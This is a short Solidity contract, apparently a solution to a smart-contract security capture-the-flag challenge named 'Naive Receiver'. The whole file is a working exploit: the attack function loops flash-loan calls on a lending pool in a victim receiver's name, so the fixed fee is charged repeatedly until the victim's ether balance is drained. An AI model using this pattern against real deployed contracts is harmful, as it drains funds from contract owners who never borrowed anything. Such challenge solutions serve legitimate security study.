// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/Address.sol';

interface LenderPool {
  function fixedFee() external returns (uint256);

  function flashLoan(address, uint256) external;
}

contract NaiveReceiverAttacker {
  using Address for address;

  function attack(LenderPool pool, address target) external {
    uint256 targetBalance = target.balance;
    uint256 fee = pool.fixedFee();
    uint256 neededCalls = targetBalance / fee;

    for (uint256 i = 0; i < neededCalls; i++) {
      pool.flashLoan(target, fee);
    }
  }
}
